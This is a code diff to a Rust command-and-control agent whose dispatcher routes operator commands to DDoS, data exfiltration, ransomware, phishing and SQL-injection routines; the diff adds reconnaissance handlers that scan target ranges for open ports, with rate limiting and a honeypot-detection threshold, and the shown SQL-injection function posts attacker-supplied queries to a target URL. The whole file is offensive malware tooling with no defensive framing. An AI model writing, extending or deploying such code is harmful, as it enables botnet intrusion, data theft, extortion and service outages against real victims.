@@ -1,18 +1,21 @@
 use crate::commands::Command;
 use crate::error::C2Error;
+use crate::recon::{ReconConfig, ReconEngine};
 use tokio::net::TcpStream;
 use tokio::io::AsyncWriteExt;
 use std::process::Command as ShellCommand;
 use std::fs;
 use std::io::{Read, Write};
 
-pub async fn execute_attack(command: &Command) -> Result<(), C2Error> {
+pub async fn execute_attack(command: &Command) -> Result<String, C2Error> {
     match command.command.as_str() {
-        "ddos" => ddos_attack(&command.args).await,
-        "exfiltrate" => data_exfiltration(&command.args).await,
-        "ransomware" => ransomware_attack(&command.args).await,
-        "phishing" => phishing_attack(&command.args).await,
-        "sql_injection" => sql_injection_attack(&command.args).await,
+        "ddos" => ddos_attack(&command.args).await.map(|_| "OK".to_string()),
+        "exfiltrate" => data_exfiltration(&command.args).await.map(|_| "OK".to_string()),
+        "ransomware" => ransomware_attack(&command.args).await.map(|_| "OK".to_string()),
+        "phishing" => phishing_attack(&command.args).await.map(|_| "OK".to_string()),
+        "sql_injection" => sql_injection_attack(&command.args).await.map(|_| "OK".to_string()),
+        "recon_scan" => recon_scan(&command.args).await,
+        "recon_full" => recon_full(&command.args).await,
         _ => Err(C2Error::CommandError("Unknown command".to_string())),
     }
 }
@@ -112,13 +115,13 @@ async fn sql_injection_attack(args: &[String]) -> Result<(), C2Error> {
 
     let target_url = &args[0];
     let malicious_query = &args[1];
-    
+
     let client = reqwest::Client::new();
     let res = client.post(target_url)
         .body(malicious_query.clone())
         .send()
         .await?;
-    
+
     if res.status().is_success() {
         println!("SQL injection successful: {}", res.text().await?);
     } else {
@@ -126,4 +129,60 @@ async fn sql_injection_attack(args: &[String]) -> Result<(), C2Error> {
     }
 
     Ok(())
+}
+
+async fn recon_scan(args: &[String]) -> Result<String, C2Error> {
+    if args.is_empty() {
+        return Err(C2Error::CommandError("recon_scan requires target specs".to_string()));
+    }
+
+    let mut config = ReconConfig::default();
+
+    if args.len() > 1 {
+        config.ports = args[1].split(',')
+            .filter_map(|p| p.trim().parse::<u16>().ok())
+            .collect();
+    }
+    if args.len() > 2 {
+        config.connect_timeout_ms = args[2].parse().unwrap_or(3000);
+    }
+    if args.len() > 3 {
+        config.rate_per_sec = args[3].parse().unwrap_or(100.0);
+    }
+
+    let engine = ReconEngine::new(config);
+    let targets: Vec<String> = args[0].split(',').map(|s| s.trim().to_string()).collect();
+    let expanded = engine.expand_targets(&targets)?;
+    let open = engine.scan_targets(&expanded).await?;
+
+    serde_json::to_string(&open).map_err(|e| C2Error::ReconError(e.to_string()))
+}
+
+async fn recon_full(args: &[String]) -> Result<String, C2Error> {
+    if args.is_empty() {
+        return Err(C2Error::CommandError("recon_full requires target specs".to_string()));
+    }
+
+    let mut config = ReconConfig::default();
+
+    if args.len() > 1 {
+        config.ports = args[1].split(',')
+            .filter_map(|p| p.trim().parse::<u16>().ok())
+            .collect();
+    }
+    if args.len() > 2 {
+        config.connect_timeout_ms = args[2].parse().unwrap_or(3000);
+    }
+    if args.len() > 3 {
+        config.rate_per_sec = args[3].parse().unwrap_or(100.0);
+    }
+    if args.len() > 4 {
+        config.honeypot_threshold = args[4].parse().unwrap_or(0.6);
+    }
+
+    let targets: Vec<String> = args[0].split(',').map(|s| s.trim().to_string()).collect();
+    let engine = ReconEngine::new(config);
+    let result = engine.full_recon(&targets).await?;
+
+    serde_json::to_string(&result).map_err(|e| C2Error::ReconError(e.to_string()))
 }
